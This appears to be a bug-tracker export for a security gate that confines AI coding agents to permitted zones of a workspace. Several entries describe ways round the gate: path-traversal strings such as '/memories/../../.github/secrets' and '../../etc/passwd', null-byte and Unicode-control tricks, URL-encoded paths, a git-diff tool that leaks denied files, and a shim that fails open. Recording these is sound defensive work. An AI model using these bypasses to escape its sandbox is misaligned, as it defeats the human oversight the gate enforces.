Title: INS-023: PermissionError when deleting read-only README.md
Description: project_creator.py create_project() uses os.unlink() to delete README.md files when include_readmes=False. The except clause only catches FileNotFoundError. On Windows, os.unlink() raises PermissionError (WinError 5) when the target file has a read-only attribute (mode 0o444). shutil.copytree() preserves the read-only attribute from the template, so a read-only README.md in the template produces a read-only README.md in the destination, which then crashes project creation.
Steps to Reproduce: 1. Create a template with a README.md that has read-only permissions (chmod stat.S_IREAD). 2. Call create_project(template_path=..., destination=..., folder_name='X', include_readmes=False). 3. Observe PermissionError: [WinError 5] Access is denied.
Expected Behaviour: project creation completes without error; all README.md files removed (or read-only file skipped gracefully without crash)
Actual Behaviour: PermissionError: [WinError 5] Access is denied propagates uncaught from os.unlink(), crashing the entire create_project() call
Comments: Fix: on PermissionError, call os.chmod(path, stat.S_IWRITE) then retry os.unlink(path). Any remaining OSError is suppressed. Added import stat. Implemented in INS-023 iteration 2.

Title: SAF-048: validate_memory path traversal bypass via /memories/../../
Description: validate_memory() checks startswith('/memories/') without resolving dot-dot segments. Path /memories/../../.github/secrets passes the virtual check and returns allow for reads, bypassing zone classification.
Steps to Reproduce: Call validate_memory({'tool_input':{'filePath':'/memories/../../.github/secrets'}}, '/workspace') — returns allow
Expected Behaviour: deny — dot-dot sequences must be resolved before virtual path detection
Actual Behaviour: allow — path lexically starts with /memories/ so zone check is skipped
Comments: Fixed in SAF-048 Iteration 2 via posixpath.normpath() before virtual path check.

Title: SAF-048: validate_memory session/../ write bypass allows writing to user memory
Description: Write check uses startswith('/memories/session/') without resolving dots. /memories/session/../preferences.md passes the session check and write is allowed, but conceptually resolves to /memories/preferences.md (user memory).
Steps to Reproduce: Call validate_memory({'tool_input':{'filePath':'/memories/session/../preferences.md','command':'save'}}, '/workspace') — returns allow
Expected Behaviour: deny — session/../ must not bypass user memory write protection
Actual Behaviour: allow — path starts with /memories/session/ lexically
Comments: Fixed in SAF-048 Iteration 2 via posixpath.normpath() resolving .. before write boundary check.

Title: SAF-048: validate_memory allows null bytes and Unicode control chars in memory paths
Description: Null bytes (0x00) and Unicode control/format chars (RLO U+202E, BOM U+FEFF) embedded in virtual memory paths are not rejected. These can be used to disguise filenames or cause unexpected behavior in downstream tools.
Steps to Reproduce: validate_memory({'tool_input':{'filePath':'/memories/session/\x00evil'}}, '/workspace') returns allow; same for RLO and BOM chars
Expected Behaviour: deny — paths containing null bytes or Unicode control characters must be rejected
Actual Behaviour: allow — no character validation is performed on virtual memory paths
Comments: Fixed in SAF-048 Iteration 2 via unicodedata.category() filter rejecting Cc/Cf characters and explicit null byte check.

Title: SAF-048: validate_memory does not normalize case — /MEMORIES/ denied instead of allowed
Description: The virtual path check is case-sensitive: /MEMORIES/session/ is not recognized as a virtual memory path and falls through to zone_classifier, which denies it. On case-insensitive filesystems (Windows), this is inconsistently safe but incorrect behavior.
Steps to Reproduce: validate_memory({'tool_input':{'filePath':'/MEMORIES/session/notes.md'}}, '/workspace') returns deny
Expected Behaviour: allow — /MEMORIES/ should be normalized to /memories/ before the virtual path check
Actual Behaviour: deny — case normalization is not applied; falls to zone_classifier
Comments: Fixed in SAF-048 Iteration 2 via .lower() applied to norm_virtual before virtual path prefix check.

Title: SAF-048 null byte check in validate_memory breaks SAF-038 filesystem path test
Description: SAF-048 Iter 2 BUG-123 fix adds null byte and Cc/Cf char check before zone_classifier in validate_memory(). Filesystem paths with null bytes (which zone_classifier strips-then-allows for project paths) are now denied. Breaks SAF-038 test_memory_null_byte_in_project_path_allow.
Steps to Reproduce: pytest tests/SAF-038/test_saf038_edge_cases.py::TestNullByteInjection::test_memory_null_byte_in_project_path_allow
Expected Behaviour: allow - zone_classifier strips C0 chars and path resolves inside project
Actual Behaviour: deny - SAF-048 null byte check fires before zone_classifier
Comments: Closed in SAF-048 Iteration 3 (2026-03-25). Resolution: Option A — SAF-038 test updated to expect deny. Null bytes in any path (including project-folder paths) are now correctly denied. Intentional security improvement, not a regression. Test renamed to test_memory_null_byte_in_project_path_deny.

Title: Path traversal bypass in _check_workspace_path_arg via Windows absolute path
Description: posixpath.normpath treats Windows drive letters as regular directory components, not absolute roots. A crafted absolute path like c:/workspace/project/../../../evil/.venv produces evil/.venv after normpath. _check_workspace_path_arg re-anchors this to ws_root making it appear safe. sanitize_terminal_command allows c:/workspace/project/../../../evil/.venv/Scripts/python -m pytest tests/.
Steps to Reproduce: 1. ws_root=c:/workspace. 2. Call _check_workspace_path_arg(c:/workspace/project/../../../etc/passwd, c:/workspace). 3. Returns True instead of False. 4. sanitize_terminal_command with crafted venv path returns allow. Module list still restricted to pytest/build/pip.
Expected Behaviour: Path traversal outside workspace must be denied (False).
Actual Behaviour: Path traversal re-anchored inside workspace; returns True (allow).

Title: _include_pattern_targets_deny_zone denies deny-zones inside project folder
Description: The any() check over ALL path components in _include_pattern_targets_deny_zone blocks includePattern values like project/.github/** and project/.vscode/** even though those patterns target the agent's project folder, not workspace-root deny zones. SAF-045 tester edge-case tests fail as a regression.
Steps to Reproduce: Call validate_grep_search with includePattern='project/.github/**' and ws_root='c:/workspace'
Expected Behaviour: allow — .github is nested inside the project folder, not the workspace-root deny zone
Actual Behaviour: deny — any() finds .github in the component list and incorrectly blocks the call
Comments: Fixed in SAF-050 iteration 2: replaced any() check with left-to-right walk that only allows deny-zone components when preceded by the project folder anchor.

Title: SAF-050 security_gate.py modified but update_hashes.py not run — _KNOWN_GOOD_GATE_HASH stale

Title: Whitespace-only fallback_session_id accepted without validation in _get_session_id()
Description: _get_session_id() checks truthiness of _fallback_session_id with 'not fallback_id', but whitespace strings like '   ' are truthy. A manually-tampered .hook_state.json with a whitespace session ID would be accepted and used as the denial counter key instead of a new UUID being generated.
Steps to Reproduce: 1. Write '   ' (3 spaces) as _fallback_session_id in .hook_state.json. 2. Invoke security_gate.py. 3. Observe session ID returned is '   ' not a new UUID.
Expected Behaviour: Non-UUID/whitespace-only session IDs should be rejected and replaced with a fresh UUID4.
Actual Behaviour: The whitespace string is accepted as a valid session ID and used as the counter dict key.
Comments: Exploitable only by an attacker with write access to .hook_state.json, which already implies full local access. Low severity. Can be fixed with fallback_id.strip() check in a future WP.

Title: VERSION constant not bumped to 3.2.2 before release - launcher stuck on 3.2.1
Description: All 5 canonical version files (config.py, pyproject.toml, setup.iss, build_dmg.sh, build_appimage.sh) still contain 3.2.1 while the GitHub release is tagged v3.2.2. check_for_update() compares VERSION 3.2.1 against latest tag 3.2.2 and always finds an update. After downloading and installing, the new binary still has VERSION=3.2.1 creating an infinite update loop. The deployed binary also bundles stale security_gate.py from before SAF-047/SAF-048 fixes were merged, causing memory tool and Get-ChildItem to remain blocked in v3.2.2 deployments.
Steps to Reproduce: 1. Install v3.2.2 from GitHub release. 2. Open launcher. 3. Version label shows v3.2.1. 4. Update available banner shows v3.2.2. 5. Download and install. 6. Launcher restarts still showing v3.2.1 and update available.
Expected Behaviour: Version label shows v3.2.2. No update banner.
Actual Behaviour: Version label shows v3.2.1. Update available banner persists. Infinite update loop.
Comments: Root cause: no version bump WP was created between 3.2.1 and the v3.2.2 release tag. Also causes SAF-047 SAF-048 fixes to not be packaged in deployed binary.

Title: get_changed_files tool not in security gate tool sets - always denied
Description: The deferred tool get_changed_files is not listed in any security gate tool set (_ALWAYS_ALLOW_TOOLS, _EXEMPT_TOOLS, or handled specially in decide()). It falls through to the unknown-tool deny path: if tool_name not in _EXEMPT_TOOLS: return deny. This is a read-only git operation that shows which files have been modified and should be allowed.
Steps to Reproduce: 1. Start conversation in TS-SAE workspace. 2. Call get_changed_files tool. 3. Security gate denies with generic Access denied message.
Expected Behaviour: get_changed_files returns list of modified files in the workspace.
Actual Behaviour: Security gate denies the tool call because get_changed_files is not in any tool set.
Comments: v3.2.2 feedback Section 3.3. Read-only git tool, safe to add to _ALWAYS_ALLOW_TOOLS.

Title: Get-ChildItem blocked in terminal while dir alias allowed
Description: Terminal security gate blocks Get-ChildItem cmdlet but allows its PowerShell alias dir. Both resolve to the same .NET method. The gate uses string matching on command text rather than resolving PowerShell aliases. get-childitem IS in the allowlist at HEAD in security_gate.py but the deployed v3.2.2 binary has a stale gate. A rebuild with the current code should fix this.
Steps to Reproduce: 1. Open TS-SAE workspace. 2. Run Get-ChildItem in terminal. 3. Denied. 4. Run dir in terminal. 5. Allowed.
Expected Behaviour: Both Get-ChildItem and dir are allowed per AGENT-RULES Section 4.
Actual Behaviour: Get-ChildItem denied, dir allowed. Stale security gate in deployed binary.
Comments: v3.2.2 feedback Section 3.1. Fixed in source (get-childitem in allowlist at HEAD). Rebuild with FIX-077 version bump will include the fix.

Title: Memory tool still blocked in v3.2.2 deployment despite SAF-048 fix
Description: SAF-048 added validate_memory() to security_gate.py to allow /memories/ and /memories/session/ access. The fix exists at HEAD and works correctly. However the deployed v3.2.2 binary was built before the fix was merged, so the bundled security_gate.py does not contain validate_memory(). All memory operations remain denied in deployed v3.2.2.
Steps to Reproduce: 1. Install v3.2.2 from GitHub release. 2. Create workspace. 3. Start conversation. 4. Attempt memory view /memories/. 5. Denied.
Expected Behaviour: Memory read and session write operations succeed per AGENT-RULES.
Actual Behaviour: All memory operations denied. Deployed binary has stale security_gate.py.
Comments: v3.2.2 feedback Section 3.2. SAF-048 fix exists in source but was not included in the v3.2.2 release build. Rebuild via FIX-077 will include it.

Title: .git directory selected as project folder by zone classifier
Description: detect_project_folder() in zone_classifier.py sorts subdirectories alphabetically and picks the first not in _DENY_DIRS. .git is absent from _DENY_DIRS, sorts before .github, and gets selected - making the real project folder inaccessible.
Steps to Reproduce: 1. git init at workspace root. 2. Any read_file/edit_file on project folder files is denied.
Expected Behaviour: .git is skipped; real project folder is selected.
Actual Behaviour: .git selected as project folder; all project files denied.

Title: get_changed_files bypasses all zone enforcement
Description: get_changed_files is in _ALWAYS_ALLOW_TOOLS, bypassing all zone checks. When a git repo exists it returns full diff content including .github/hooks/scripts/security_gate.py, zone_classifier.py, and other denied-zone files.
Steps to Reproduce: 1. git init at workspace root. 2. git add . 3. Call get_changed_files. 4. Full content of all files including denied zones returned.
Expected Behaviour: Denied-zone files excluded from output.
Actual Behaviour: Complete zone enforcement bypass.
Comments: SAF-058

Title: Memory tool still blocked despite SAF-048 marked Done
Description: SAF-048 added validate_memory() to security_gate.py with correct logic for /memories/ paths. v3.2.3 testing shows all memory operations still denied. Possible causes: (a) test workspace deployed with pre-SAF-048 code, (b) integrity hash mismatch, (c) validate_memory() not reached in decide() flow.
Steps to Reproduce: 1. memory view /memories/ - denied. 2. memory view /memories/session/ - denied. 3. memory create /memories/session/test.md - denied.
Expected Behaviour: All three operations succeed per SAF-048.
Actual Behaviour: All three denied.
Comments: SAF-060

Title: Copilot instructions in .github/ wastes Block 1 every conversation
Description: System prompt:customizationsIndex directs agent to read .github/instructions/copilot-instructions.md. This is in a permanently denied zone. Block 1 is consumed automatically every conversation.
Steps to Reproduce: 1. Start a new conversation. 2. Agent attempts to read copilot-instructions.md per system prompt. 3. Denied - Block 1 consumed.
Expected Behaviour: Agent can read its own configuration without penalty.
Actual Behaviour: Block 1 wasted every conversation.

Title: Skill files in .github/skills/ inaccessible to agents
Description: Skills index directs agent to read .github/skills/*/SKILL.md. File is in denied zone. Any skill-matching request wastes a block.
Steps to Reproduce: 1. User request matches a skill. 2. Agent attempts to read SKILL.md. 3. Denied.
Expected Behaviour: Agent can load skill files.
Actual Behaviour: Skill files inaccessible.

Title: Remove-Item blocked but del alias allowed (terminal inconsistency)
Description: Both Remove-Item and del are in _COMMAND_ALLOWLIST with identical CommandRule. Yet Remove-Item is blocked while del works. Root cause needs investigation - possibly a Stage 3 obfuscation pattern false positive on the cmdlet name.
Steps to Reproduce: 1. del Test-v3.2.3/debug-probe.txt - allowed. 2. Remove-Item Test-v3.2.3/debug-probe.txt - denied.
Expected Behaviour: Both succeed (identical rules).
Actual Behaviour: Remove-Item denied, del allowed.

Title: dir -Name blocked (terminal false positive)
Description: dir with no flags works but dir -Name is denied. -Name is a valid PowerShell parameter for controlling output format, not a security risk. Likely triggers Stage 5 argument validation treating -Name as a path-like token.
Steps to Reproduce: 1. dir Test-v3.2.3/ - allowed. 2. dir -Name - denied.
Expected Behaviour: dir -Name allowed.
Actual Behaviour: Denied.

Title: Parenthesized subexpressions blocked in terminal
Description: PowerShell expressions like (Get-Content file).Count and (echo hello).Length are denied. Stage 3 or other pattern blocks all PowerShell property-access patterns using parenthesized groups.
Steps to Reproduce: 1. (Get-Content Test-v3.2.3/file.txt).Count - denied. 2. (echo hello).Length - denied.
Expected Behaviour: Property-access on grouped commands is allowed.
Actual Behaviour: Denied.

Title: Test-Path not in terminal command allowlist
Description: Test-Path is a read-only PowerShell diagnostic cmdlet (checks if path exists). Not in _COMMAND_ALLOWLIST. Should be added to Category G (read-only inspection) with path_args_restricted=True.
Steps to Reproduce: 1. Test-Path .git - denied.
Expected Behaviour: Allowed (read-only diagnostic).
Actual Behaviour: Denied - not in allowlist.

Title: Parallel denial batching non-deterministic
Description: In v3.2.2 parallel denied operations consistently shared block numbers. In v3.2.3 behavior is inconsistent - some parallel batches share blocks, others do not. Two memory calls got separate blocks while two list_dir calls shared one block.
Steps to Reproduce: 1. Issue two parallel tool calls targeting denied zones. 2. Observe block counter - sometimes +1, sometimes +2.
Expected Behaviour: Consistent behavior - parallel batch shares one block.
Actual Behaviour: Non-deterministic.
Comments: SAF-061

Title: No .venv Python environment despite AGENT-RULES reference
Description: AGENT-RULES section 4 prescribes .venv\Scripts\python but no .venv exists in the workspace. Agents following rules faithfully will attempt .venv first, fail, then fall back to system Python.
Steps to Reproduce: 1. Read AGENT-RULES section 4. 2. Attempt .venv\Scripts\python --version. 3. Fails - no .venv.
Expected Behaviour: Rules match reality.
Actual Behaviour: Rules reference non-existent .venv.
Comments: SAF-056

Title: NoAgentZone hidden from VS Code file explorer
Description: **/NoAgentZone is in files.exclude, making the folder invisible in the VS Code explorer. Users cannot manage its contents without the terminal. Should be visible since security gate handles access control.
Steps to Reproduce: 1. Open workspace in VS Code. 2. NoAgentZone not visible in explorer.
Expected Behaviour: Folder visible.
Actual Behaviour: Hidden by files.exclude.

Title: macOS launcher crashes immediately with SIGKILL
Description: The v3.2.3 arm64 DMG launcher crashes immediately upon execution with signal 143 (SIGKILL). Memory usage is 48 bytes - the process is killed before any code runs. Even from the mounted DMG. Root cause is likely PyInstaller embedded Python.framework or dylib loading failure.
Steps to Reproduce: 1. Download AgentEnvironmentLauncher-3.2.3-arm64.dmg. 2. Mount DMG. 3. Run ./launcher from terminal or double-click .app. 4. Process exits immediately with SIGKILL.
Expected Behaviour: Launcher GUI appears.
Actual Behaviour: Immediate crash, no output, 48 bytes memory.

Title: macOS code signature corrupted when copying .app from DMG
Description: Copying the .app bundle from the DMG to ~/Applications/ breaks the code signature. spctl reports 'a sealed resource is missing or invalid'. PyInstaller bundles have complex nested signatures (dylibs, frameworks, executables) that are damaged by standard Finder copy operations.
Steps to Reproduce: 1. Mount DMG. 2. Drag .app to Applications. 3. spctl -a -v ~/Applications/AgentEnvironmentLauncher.app - signature invalid.
Expected Behaviour: Signature intact after copy.
Actual Behaviour: Signature broken.

Title: macOS Gatekeeper blocks unsigned/unnotarized app
Description: The launcher uses ad-hoc code signing (codesign_identity='-' in launcher.spec). macOS Gatekeeper blocks execution with 'Apple cannot check it for malicious software'. Proper fix requires Apple Developer Certificate plus notarization. Source distribution bypasses this entirely.
Steps to Reproduce: 1. Download DMG from GitHub Releases. 2. Copy to Applications. 3. Double-click - Gatekeeper warning.
Expected Behaviour: App launches normally.
Actual Behaviour: Gatekeeper blocks execution.

Title: URL-encoded paths bypass zone classification via is_workspace_root_readable
Description: is_workspace_root_readable() in zone_classifier.py does not URL-decode paths before classification. A URL-encoded path like %2egithub%2fhooks%2fsecurity_gate.py is treated as a single-component workspace-root filename (not in _DENY_DIRS), causing it to return True. The security gate then allows the tool call. No real exploit exists since the OS has no file with that URL-encoded name, but the zone classification is inaccurate.
Steps to Reproduce: 1. Call security_gate.decide() with tool_name=read_file and filePath=%2egithub%2fhooks%2fsecurity_gate.py. 2. Observe result is 'allow' instead of 'deny'.
Expected Behaviour: Zone classifier should URL-decode paths before classification, returning deny for the encoded .github/hooks/ path.
Actual Behaviour: is_workspace_root_readable treats %2egithub%2fhooks%2fsecurity_gate.py as a single workspace-root child entry (no slash separators after URL encoding), bypassing _DENY_DIRS check. Returns allow.
Comments: Pre-existing issue, not introduced by SAF-055. No working exploit: the OS refuses to open files with URL-encoded names. Low priority but fix would harden zone_classifier for uncommon edge cases. Discovered during SAF-055 tester edge-case analysis.

Title: SAF-058: validate_get_changed_files does not detect .git FILE at workspace root
Description: validate_get_changed_files uses os.path.isdir() which returns False for .git files used in git worktrees or submodules at workspace root. If workspace is set up as a worktree, get_changed_files would be allowed even though diffs could include denied-zone file paths.
Steps to Reproduce: 1. Configure workspace root as a git worktree (creating a .git FILE, not directory). 2. Call validate_get_changed_files(ws_root). 3. Observe result is 'allow'.
Expected Behaviour: Deny or explicitly document .git-file-as-worktree case with security rationale
Actual Behaviour: Function returns 'allow' because os.path.isdir() is False for a file
Comments: Low severity: worktree setups at WS root are uncommon. Documented in test_saf058_tester_edge_cases.py::test_git_file_at_workspace_root_is_allowed. Design decision should be reviewed and explicitly documented.

Title: docs/macos-installation-guide.md has CRLF line endings
Description: macos-installation-guide.md contains 287 CRLF line endings. While .md files render fine in GitHub, LF-only is preferred for repository consistency.
Steps to Reproduce: Check with: python -c import sys; open('docs/macos-installation-guide.md','rb').read().count(13)
Expected Behaviour: 0 CRLF line endings
Actual Behaviour: 287 CRLF line endings
Comments: Non-blocking. Found during INS-026 tester review. Add .gitattributes for prevention.

Title: apply_source_update docstring contract: TimeoutExpired not wrapped as RuntimeError
Description: apply_source_update() docstring states 'Raises RuntimeError on any failure'. However, subprocess.TimeoutExpired from git pull (timeout=60) or pip install (timeout=120) propagates directly to the caller without being wrapped in RuntimeError. Callers that only catch RuntimeError will miss timeout exceptions.
Steps to Reproduce: 1. Mock subprocess.run to raise subprocess.TimeoutExpired. 2. Call apply_source_update(). 3. Observe TimeoutExpired propagates, not RuntimeError.
Expected Behaviour: TimeoutExpired is wrapped in RuntimeError so the documented interface contract is consistent.
Actual Behaviour: subprocess.TimeoutExpired propagates unwrapped. Callers relying on RuntimeError will receive an unhandled exception.
Comments: Documented by tester edge-case tests: test_git_pull_timeout_propagates_as_timeout_expired and test_pip_install_timeout_propagates_as_timeout_expired. Non-blocking for INS-027 PASS verdict as core functionality is correct.

Title: DOC-008 test_existing_content_preserved fails — missing Coding Standards and Communication sections
Description: test_existing_content_preserved asserts copilot-instructions.md contains sections named Coding Standards and Communication, but these sections are absent.
Steps to Reproduce: Run pytest tests/DOC-008/test_doc008_read_first_directive.py::test_existing_content_preserved
Expected Behaviour: Test passes — sections present in copilot-instructions.md
Actual Behaviour: AssertionError: missing sections: Coding Standards, Communication. Pre-existing on main branch.

Title: Stale egg-info: importlib.metadata returns 3.1.0 not current version
Description: PKG-INFO in egg-info reports 3.1.0
Steps to Reproduce: python -c import importlib.metadata; print
Comments: Pre-existing. Fix: pip install -e .

Title: Python runtime path lost/corrupted during in-app version update
Description: When updating the launcher from v3.2.3 to v3.2.4 via the GUI (Download and Install Update), the python-path.txt file gets corrupted or overwritten with an invalid path. The security gate cannot run because ts-python cannot find the Python executable. The user must manually open Settings > Auto-detect to recover the correct path. This was discovered because the PreToolUse hook silently stopped working after the update.
Steps to Reproduce: 1. Run launcher v3.2.3. 2. Click Download and Install Update to upgrade to v3.2.4. 3. After update completes and new launcher opens, create a workspace. 4. Open workspace in VS Code and trigger any agent tool use. 5. Observe: security gate does not run. 6. Open launcher Settings. 7. Observe: Python runtime path shows an invalid path. 8. Click Auto-detect — correct path is found immediately.
Expected Behaviour: After a version update via the GUI, python-path.txt retains a valid path pointing to the bundled python-embed/python.exe in the new installation directory.
Actual Behaviour: python-path.txt contains an invalid path after the update. The security gate silently fails, causing all tool calls to pass through unchecked (fail-open).
Comments: Discovered during v3.2.4 agent feedback testing. The Inno Setup CurStepChanged(ssPostInstall) writes python-path.txt but the path appears to be invalid after the update completes. Root cause TBD — may be a race condition, installer {app} variable mismatch, or the old launcher overwriting the file before exiting.

Title: ts-python shim fails open when Python path is invalid
Description: When python-path.txt is missing, empty, or points to a non-existent Python executable, the ts-python shim prints an error to stderr and exits with code 1 but emits no JSON on stdout. VS Code treats the hook as failed and silently allows the tool call through. The entire security gate is bypassed with zero indication to agent or user. The system fails open instead of failing closed.
Steps to Reproduce: 1. Delete or corrupt python-path.txt. 2. Open workspace in VS Code. 3. Trigger agent tool use. 4. ts-python exits code 1 with stderr error. 5. No JSON on stdout. 6. VS Code allows tool call - security gate fully bypassed.
Expected Behaviour: When Python runtime is unavailable, the shim outputs a valid deny JSON response to stdout so VS Code blocks the tool call. Agent and user are informed the security gate is offline.
Actual Behaviour: Shim prints error to stderr only and exits code 1. stdout is empty. VS Code allows tool call through (fail-open). No indication to agent or user.
Comments: Root cause of fail-open behavior in v3.2.4 feedback report. Combined with BUG-156 creates critical security gap. Fix must be at shim level: output deny JSON when Python executable unavailable.

Title: Workspace root README.md missing in v3.2.4 (regression from v3.2.3)
Description: The workspace root README.md that was present in v3.2.3 is missing in v3.2.4. This file provided initial orientation for agents. It was first missing in v3.2.2, fixed in v3.2.3, and regressed in v3.2.4.
Steps to Reproduce: 1. Create a new workspace with v3.2.4 launcher. 2. Look for README.md at workspace root. 3. File not found.
Expected Behaviour: README.md exists at workspace root with project structure and zone documentation.
Actual Behaviour: README.md is missing from workspace root. read_file returns unable to resolve nonexistent file.
Comments: Regression. Was present in v3.2.3. Low severity since info is available in AGENT-RULES.md. Fixed in FIX-086 by ensuring template README.md has proper agent-workbench specific content and tests cover the regression.

Title: macOS source install CI test step fails — pytest not installed in venv
Description: The macos-source-test.yml workflow Run test suite step fails with No module named pytest. The install-macos.sh script creates a venv and installs production deps only (pip install .) but the CI workflow runs pytest from that venv. pytest is a dev dependency not included in the production install.
Steps to Reproduce: 1. Push to main or tag a release. 2. macos-source-test.yml triggers. 3. Step Run test suite with venv Python fails: No module named pytest.
Expected Behaviour: CI installs pytest into the venv before running the test suite, or runs tests with a Python that has pytest.
Actual Behaviour: venv Python has no pytest. Test step fails with exit code 1 on every run.
Comments: Pre-existing issue, not caused by v3.2.5. All production builds (release.yml) succeed.

Title: FIX-087 breaks INS-028 tests: pip install pytest step matches pytest-in-run check
Description: FIX-087 added a step 'pip install pytest' to macos-source-test.yml. This step contains the word 'pytest' in its run field. INS-028 tester edge case tests check 'if pytest in run: assert -x in run' and 'assert --tb=short in run'. The pip install step triggers these checks and fails them because pip install commands do not use pytest run flags. The INS-028 tests were written assuming all steps containing pytest are pytest invocations, but FIX-087 introduced a non-invocation step.
Steps to Reproduce: 1. Apply FIX-087 changes to macos-source-test.yml. 2. Run pytest tests/INS-028/test_ins028_tester_edge_cases.py::test_pytest_uses_fail_fast_flag and ::test_pytest_uses_short_traceback. 3. Both fail: Got: '~/.local/share/TurbulenceSolutions/venv/bin/pip install pytest'
Expected Behaviour: INS-028 tests pass after FIX-087. The pip install step is not a pytest invocation and should not be checked for -x/--tb=short flags.
Actual Behaviour: 2 INS-028 tests fail: test_pytest_uses_fail_fast_flag and test_pytest_uses_short_traceback. They match the pip install step instead of the python -m pytest step.
Comments: Fix: In tests/INS-028/test_ins028_tester_edge_cases.py, narrow the check from 'if pytest in run' to 'if python -m pytest in run' in both failing tests.

Title: DOC-032 breaks DOC-005 test: test_table_contains_memory_tool_entry
Description: DOC-032 removed the memory tool row from the Known Tool Limitations table in copilot-instructions.md, but did not update the pre-existing DOC-005 test test_table_contains_memory_tool_entry which asserts that row's presence. The full test suite now fails with 1 regression.
Steps to Reproduce: 1. Checkout DOC-032/copilot-instructions-fix. 2. Run: .venv\Scripts\python.exe -m pytest tests/ -x --tb=short -q. 3. Observe FAILED tests\DOC-005\test_doc005_limitations.py::test_table_contains_memory_tool_entry.
Expected Behaviour: All existing tests pass after DOC-032 changes.
Actual Behaviour: test_table_contains_memory_tool_entry in tests/DOC-005 fails because the memory tool row was removed from the limitations table without updating the DOC-005 test.
Comments: DOC-032 developer must update tests/DOC-005/test_doc005_limitations.py: remove test_table_contains_memory_tool_entry and remove memory from LIMITATION_ENTRIES list.

Title: DOC-033 README replacement breaks 8 DOC-002 regression tests
Description: DOC-033 replaced templates/agent-workbench/README.md with a user-facing version, but 8 existing DOC-002 tests assert content from the old agent-facing README.
Steps to Reproduce: 1. Apply DOC-033 changes. 2. Run pytest tests/DOC-002/ -v
Expected Behaviour: All DOC-002 tests pass
Actual Behaviour: 8 DOC-002 tests fail: tier1/tier2/exempt-tools content missing, WORKSPACE_NAME present when tests expect it absent, only 3 PROJECT_NAME occurrences instead of 4
Comments: Fixed in DOC-033 Iteration 2: updated DOC-002 test assertions to match new user-facing README content.

Title: GUI shows 3.2.5 after updating to 3.2.6 - version strings not bumped
Description: Version strings in config.py, pyproject.toml, setup.iss, and build_dmg.sh were not bumped for the v3.2.6 release. The GUI displays 3.2.5, the update checker sees 3.2.6 on GitHub, offers the download, but the installed binary still reports 3.2.5 creating an infinite update loop.
Steps to Reproduce: 1. Install v3.2.6 release. 2. Launch the application. 3. Observe version display shows 3.2.5. 4. Click Check for Updates. 5. Download and install update. 6. Launch again - still shows 3.2.5.
Expected Behaviour: GUI shows 3.2.6 after installing the v3.2.6 release. No update offered when on latest version.
Actual Behaviour: GUI shows 3.2.5. Update check finds 3.2.6 available. Downloading and installing does not change the displayed version. Infinite update loop.
Comments: Regression - same issue occurred previously (FIX-078). Version bump must be part of the release checklist.

Title: build_appimage.sh APP_VERSION not bumped to 3.2.6
Description: src/installer/linux/build_appimage.sh still reads APP_VERSION=3.2.4 after FIX-088 bumped the other 4 version files to 3.2.6. The WP scope listed only 4 files and excluded this Linux installer, but the inconsistency causes FIX-078 regression tests (test_all_version_files_agree) to detect a version mismatch.
Steps to Reproduce: 1. Open src/installer/linux/build_appimage.sh. 2. Search for APP_VERSION. 3. Observe APP_VERSION=3.2.4 instead of 3.2.6.
Expected Behaviour: APP_VERSION=3.2.6 in build_appimage.sh matching all other version files
Actual Behaviour: APP_VERSION=3.2.4 in build_appimage.sh while all other 4 version files read 3.2.6
Comments: Discovered during FIX-088 testing. FIX-078 test test_all_version_files_agree also covers this file. MNT-004 resolves root cause by including build_appimage.sh in the unified release.py version bump script and fixing APP_VERSION to 3.2.6.

Title: release.py validate_version accepts trailing newline due to Python regex dollar-sign quirk
Description: SEMVER_RE uses dollar-sign anchor which in Python matches before a trailing newline. validate_version('3.2.7\n') returns True. Fix: use \Z instead of dollar-sign in SEMVER_RE.
Steps to Reproduce: Call rel.validate_version with string '3.2.7' followed by newline character
Expected Behaviour: validate_version returns False for version with embedded newline
Actual Behaviour: validate_version returns True due to Python re dollar-sign matching before trailing newline

Title: coordinator.agent.md: unclosed double-quoted string in argument-hint YAML field
Description: The argument-hint field in coordinator.agent.md is missing its closing double-quote. yaml.safe_load() raises ScannerError. Any YAML parser will fail to parse the frontmatter.
Steps to Reproduce: 1. Read templates/agent-workbench/.github/agents/coordinator.agent.md line 7. 2. Note argument-hint value has no closing double-quote. 3. Run python -c import yaml;yaml.safe_load() on frontmatter.
Expected Behaviour: YAML frontmatter parses cleanly
Actual Behaviour: yaml.scanner.ScannerError: while scanning a quoted scalar found unexpected end of stream

Title: create_project path-traversal guard bypassed by slash-prefix input
Description: The path traversal guard in create_project() can be bypassed when folder_name contains a slash-based traversal (e.g. ../../etc/passwd). After prepending the SAE- brand prefix, the resulting string SAE-../../etc/passwd is parsed by pathlib as ['SAE-..', '..', 'etc', 'passwd']. The '..' component ascends from the non-existent SAE-.. directory back to the destination dir, so is_relative_to() incorrectly returns True and no ValueError is raised.
Steps to Reproduce: 1. Call create_project(template, dest, '../../etc/passwd'). 2. Observe no ValueError is raised. 3. The created folder lands at dest/etc/passwd rather than an exception.
Expected Behaviour: ValueError raised with message 'Invalid folder name: path traversal attempt detected'
Actual Behaviour: No exception raised; folder created at dest path resolved through .. components
Comments: Discovered by Tester Agent during GUI-033 review. Pre-existing bug: present before the TS-SAE to SAE rename. Captured in xfail test test_create_project_path_traversal_still_blocked in tests/GUI-033/test_gui033_edge_cases.py. Should be fixed in a dedicated security WP.

Title: copilot-instructions.md incorrectly labels .github/ as permanent deny
Description: copilot-instructions.md lists .github/ alongside .vscode/ and NoAgentZone/ under the off-limits permanent deny section. The actual policy (defined in AGENT-RULES §2) allows read_file for individual files in .github/instructions/ .github/skills/ .github/agents/ and .github/prompts/. An agent reading only copilot-instructions.md will skip skill loading entirely — a required behaviour — because it believes .github/ is fully denied.
Steps to Reproduce: 1. Read templates/agent-workbench/.github/instructions/copilot-instructions.md. 2. Note Off-limits: .github/, .vscode/, NoAgentZone/ line. 3. Attempt to read .github/skills/safety-critical/SKILL.md — agent refuses based on instructions.
Expected Behaviour: copilot-instructions.md accurately reflects partial read-only access: individual files in .github/instructions/ .github/skills/ .github/agents/ .github/prompts/ are allowed; list_dir on .github/ and all writes are denied
Actual Behaviour: copilot-instructions.md causes agents to skip all skill loading due to overstated .github/ restriction
Comments: Found during v3.3.6 agent feedback testing.

Title: Parallel denial batch window too tight — second batch spills across two blocks
Description: _DENY_BATCH_WINDOW_MS = 100 in security_gate.py. During v3.3.6 testing the first parallel batch of 3 denied calls correctly shared Block 1, but the second parallel batch of 3 split across Blocks 3 and 4 — one call arrived just after the 100ms window closed. Agents following the documented 'batch parallel probes to share a block' guidance can still waste blocks faster than expected.
